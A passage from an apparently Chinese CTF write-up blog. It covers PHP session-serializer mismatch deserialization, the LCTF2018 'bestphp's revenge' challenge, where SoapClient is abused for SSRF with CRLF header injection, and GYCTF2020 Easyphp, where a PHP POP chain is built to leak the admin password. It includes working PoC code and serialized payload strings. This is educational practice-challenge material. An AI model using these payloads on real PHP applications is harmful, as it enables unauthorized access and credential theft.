<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);</span><br><span class="line">session_start();</span><br><span class="line">&#x2F;&#x2F; do something</span><br></pre></td></tr></table></figure>

<h3 id="存储机制"><a href="#存储机制" class="headerlink" title="存储机制"></a>存储机制</h3><p>php中的session内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项<code>session.save_handler</code>来进行确定的，默认是以文件的方式存储。</p>
<h3 id="session反序列化利用"><a href="#session反序列化利用" class="headerlink" title="session反序列化利用"></a>session反序列化利用</h3><p>session序列化的危害主要来自于不同存储引擎的解析存储方法不同，如果对同一组输入值进行不同的解析方式，那么就会产生风险。<br>例:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_SESSION[&#39;ryat&#39;] &#x3D; &#39;|O:11:&quot;PeopleClass&quot;:0:&#123;&#125;&#39;;</span><br></pre></td></tr></table></figure>

<p>上述session使用的是php_serialize，所以最后的存储内容是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;|O:11:&quot;PeopleClass&quot;:0:&#123;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>但是如果我们在读取的过程中选择PHP，那么就会变成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array (size&#x3D;1)</span><br><span class="line">  &#39;a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;&#39; &#x3D;&gt; </span><br><span class="line">    object(__PHP_Incomplete_Class)[1]</span><br><span class="line">      public &#39;__PHP_Incomplete_Class_Name&#39; &#x3D;&gt; string &#39;PeopleClass&#39; (length&#x3D;11)</span><br></pre></td></tr></table></figure>

<p>也就是PeopClass这个类也会在反序列化读取中被执行<br>这是因为当使用php引擎的时候，php引擎会以**|**作为作为key和value的分隔符，那么就会将<code>a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;</code>作为SESSION的key，将<code>O:11:&quot;PeopleClass&quot;:0:&#123;&#125;</code>作为value，然后进行反序列化，最后就会得到PeopleClas这个类。<br>这种由于序列化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。</p>
<h2 id="lctf-bestphp’s-revenge"><a href="#lctf-bestphp’s-revenge" class="headerlink" title="lctf-bestphp’s revenge"></a>lctf-bestphp’s revenge</h2><h3 id="SOAP简介"><a href="#SOAP简介" class="headerlink" title="SOAP简介"></a>SOAP简介</h3><p>SOAP（Simple Object Access Protocol）是一种在 web service 通信时所用的基于 xml 的协议。<br>可以用来修改报文，以及修改访问的目标的ip<br><a href="https://wooyun.js.org/drops/Trying%20to%20hack%20Redis%20via%20HTTP%20requests.html">https://wooyun.js.org/drops/Trying%20to%20hack%20Redis%20via%20HTTP%20requests.html</a></p>
<p>看题目：<br>flag.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">only localhost can get flag!session_start();</span><br><span class="line">echo &#39;only localhost can get flag!&#39;;</span><br><span class="line">$flag &#x3D; &#39;LCTF&#123;*************************&#125;&#39;;</span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;]&#x3D;&#x3D;&#x3D;&quot;127.0.0.1&quot;)&#123;</span><br><span class="line">       $_SESSION[&#39;flag&#39;] &#x3D; $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure>

<p>他需要loalhost访问，那基本是SSRF的题目了，接下来就寻找一下如何突破:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">&#x27;f&#x27;</span>], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;name&#x27;</span>] = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span> <span class="keyword">array</span>(<span class="number">0</span>) &#123;&#125; </span><br></pre></td></tr></table></figure>

<p>我们可以看到这里输出的唯一内容是session，所以我们需要从session进行入手。<br>session通过修改存储机制可以进行反序列化：<br>而session正好有可以修改配置文件的函数<br>session_start()<br>eg：<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210720155410.png" alt="img" style="zoom:67%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210720155357.png" alt="img" style="zoom:67%;">

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 设置 cookie 的有效时间为 1 天</span></span><br><span class="line">session_start([</span><br><span class="line">    <span class="string">&#x27;cookie_lifetime&#x27;</span> =&gt; <span class="number">86400</span>,</span><br><span class="line">]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过调用soapclient类就可以实现修改访问的ip了<br>soapclient内置类的开启需要在php.ini中进行配置<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210720160555.png" alt="img" style="zoom:67%;"></p>
<p>接下来就是构造payload，先通过一个简单的实例，通过构造这样的一个类，可以实现发送到服务端地址的改变：<br>这是php手册中关于soapclient类的construct构造的定义<br><a href="https://www.php.net/manual/zh/soapclient.construct.php">https://www.php.net/manual/zh/soapclient.construct.php</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果在 WSDL 模式下工作，则此参数是可选的。如果在非 WSDL 模式下工作，则必须设置location和 uri选项，其中location 是将请求发送到的 SOAP 服务器的 URL,是 SOAP 服务uri 的目标名称空间。</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>,<span class="string">&quot;uri&quot;</span>=&gt;<span class="string">&quot;http://127.0.0.1/&quot;</span>,<span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;a:c\r\n&quot;</span> .<span class="string">&quot;Cookie:PHPSESSID=1&quot;</span>,));</span><br><span class="line"><span class="comment">//这个uri没有强制指定，所以都可以</span></span><br><span class="line"><span class="keyword">echo</span>(urlencode(serialize($a)));</span><br></pre></td></tr></table></figure>

<p>好的基本信息大概都清楚了，接下来就是如何利用题目中的函数实现，首先我们先用php_serialize存储机制存入SoapClient，首先构造一下我们需要反序列化的soap类，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>,<span class="string">&quot;uri&quot;</span>=&gt;<span class="string">&quot;http://test-uri/&quot;</span>,<span class="string">&quot;Cookie:PHPSESSID=i9n0hbcqn1vmhnpdnterckj8h0&quot;</span>))</span><br><span class="line"><span class="comment">//这个uri没有强制指定，所以都可以,PHPsessid需要设置不然访问不到</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">call_user_func()把第一个参数作为回调函数调用,其他参数是回调函数的参数</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721090834.png" alt="img"></p>
<p>成功写入<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721090758.png" alt="img" style="zoom:67%;"></p>
<p>接下里进行改内容的反序列化调用，由于soap的ssrf是需要调用_call方法的，所以这里我们要想想如何调用什么不存在的类和方法=-=，可想而知 就是这里的welcome_to…..，具体的运作逻辑如下</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721091330.png" alt="img" style="zoom:67%;">

<p>几个函数补充了解一下：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721091457.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721091458.png" alt="img" style="zoom:67%;"></p>
<p>题目中接下来的代码运作是：首先reset将数组的内部指针指向第一个单元也就是SoapClient，然后将welcome_..也合并在这个数组当中</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721091653.png" alt="img"><br>最后再使用implode将这个数组转化为字符串，但其中都没有触发过这个soap的__call方法<br>这里我们可以将变量b覆盖为call_user_func,令其在最后调用执行SoapClient，但是传入的b会被写入为数组形式，所以我们还需要一个函数将其释放出来，就是<br><code>extract()</code><br>它的主要作用是将数组展开，键名作为变量名，元素值为变量值</p>
<p>所以payload如下:</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721095814.png" alt="img" style="zoom:67%;">

<p>访问session=1（刚刚设置的）</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721095946.png" alt="img" style="zoom:67%;">

<h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><p>1.session反序列化机制主要是利用session存储机制不同所造成的的漏洞<br>2.判别标准是：session是否开启，session_start函数是否可以被调用，是否存在多余参数可以用来控制session_handler。<br>3.可以利用soap内置类实现ssrf</p>
]]></content>
  </entry>
  <entry>
    <title>GYCTF2020-Easyphp</title>
    <url>/2021/07/18/GYCTF2020-Easyphp/</url>
    <content><![CDATA[<h2 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h2><p><a href="http://www.zip备份文件下载下来审计一下/">www.zip备份文件下载下来审计一下</a>~<br>有点好笑哈哈哈哈哈哈~</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718165402.png" alt="img" style="zoom:50%;">

<p>在lib.php中看到很多类和方法，盲猜就是需要反序列化，然后搜索了一下unserialize函数<br>发现在update函数中果然有这个函数。但是没看到传参的入口，于是再看看其他文件，发现：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718191702.png" alt="img" style="zoom:67%;"><br>包含了flag.php，回想到刚刚看到的file_get_contents~这不就呼应上了？不过还是要再继续看看，别等下走了歪路。。。<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718191757.png" alt="img" style="zoom:67%;"></p>
<p>回到update.php中，我们可以发现，即使login!=1依旧会执行$users-&gt;update();，而这个函数在lib.php中，反序列化了getNewinfo()中的内容<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718193631.png" alt="img" style="zoom:67%;"><br>继续看getNewInfo()里面的内容，可以使用post传入age和nickname，实现参数的传入<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718193720.png" alt="img" style="zoom:67%;"><br>但是由于有个safe函数，所以我们直接通过file_get_contents包含是不太可能的==于是想想有没有其他，可以发现这个safe函数，他是通过将危险字符串换成hacker来达到过滤的目的，这样的话就意味着存在反序列化字符串逃逸的的风险<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718213518.png" alt="img" style="zoom:67%;"><br>继续查看一下他的整体代码逻辑，不难发现nickname和age会被插入在这里执行update操作：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210719104918.png" alt="img" style="zoom:67%;"><br>我们的最终目标应该是修改admin的密码，使得我们可以登录，所以这里的update语句似乎也没有多大意义的亚子，于是我们看看其他地方能不能构造出一条链出来,如果我们可以是用login方法，它会创造一个新的类也就是dbCtrl，接下来就会执行查询的sql语句，但是查询结果似乎是只有回显id，我们需要的是密码，所以好像意义不太大？，继续往下看看</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210719161103.png" alt="img" style="zoom:67%;">

<p>在user里面还有一个tostring，通常是用来做跳板的：当一个类被转换成字符串时被调用，update函数也是User里面的，所以应该是其他地方的跳回来这里吧，继续往下</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210719161922.png" alt="img"></p>
<p>这是一个新的类，其中有一个call方法，即调用不可访问或不存在的方法时被调用，一般也是用来做跳板的，他最后是login的，login就两个地方，一个是dbCtrl，一个是User，要去哪个呢？，感觉应该是要去dbCtrl，为什么呢，继续往下看看<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210719162319.png" alt="img"></p>
<p>这边echo了sql，应该是echo查询结果吧，echo输出的内容是字符串，所以应该是从这里开始起跳到User里面，</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210719162618.png" alt="img" style="zoom:67%;">

<p>整理一下思路，从UpdateHelper中构造查询sql语句然后通过destruct将nickname赋值为Info类，调用info里面的call方法，并将ctrlcase赋值为dbCtrl使其使用login方法查询sql结果，</p>
<p>构造一下在本地调试一波看看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$argument</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;as119801222&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;security&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> UpdateHelper();</span><br><span class="line">$b=<span class="keyword">new</span> User();</span><br><span class="line">$c=<span class="keyword">new</span> Info();</span><br><span class="line">$d=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">$b-&gt;age=<span class="string">&quot;select password from users where username=&#x27;admin&#x27;&quot;</span>;</span><br><span class="line">$c-&gt;CtrlCase=$d;</span><br><span class="line">$b-&gt;nickname=$c;</span><br><span class="line">$a-&gt;sql=$b;</span><br><span class="line"><span class="keyword">echo</span> (serialize($a));</span><br><span class="line">unserialize(<span class="string">&quot;O:12:\&quot;UpdateHelper\&quot;:1:&#123;s:3:\&quot;sql\&quot;;O:4:\&quot;User\&quot;:3:&#123;s:2:\&quot;id\&quot;;N;s:3:\&quot;age\&quot;;s:49:\&quot;select password from users where username=&#x27;admin&#x27;\&quot;;s:8:\&quot;nickname\&quot;;O:4:\&quot;Info\&quot;:1:&#123;s:8:\&quot;CtrlCase\&quot;;O:6:\&quot;dbCtrl\&quot;:8:&#123;s:8:\&quot;hostname\&quot;;s:9:\&quot;localhost\&quot;;s:6:\&quot;dbuser\&quot;;s:4:\&quot;root\&quot;;s:6:\&quot;dbpass\&quot;;s:11:\&quot;as119801222\&quot;;s:8:\&quot;database\&quot;;s:8:\&quot;security\&quot;;s:4:\&quot;name\&quot;;N;s:8:\&quot;password\&quot;;N;s:6:\&quot;mysqli\&quot;;N;s:5:\&quot;token\&quot;;N;&#125;&#125;&#125;&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>调试完以后是按照想象中的跳了，但是没出来密码？所以想说再构造一下试试看，试了几次都没出密码，于是看了一下wp，发现几件事，首先，idresult对应的是查询出来的第一个参数，所以我们的查询语句应该是select password,id from users where username=？<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210719172049.jpg" alt="img"></p>
<p>其次 查询的对象也就是name的赋值需要在这里赋值:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210719172204.png" alt="img" style="zoom:67%;"></p>
<p>所以改良以后的poc为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$argument</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;as119801222&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;security&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span 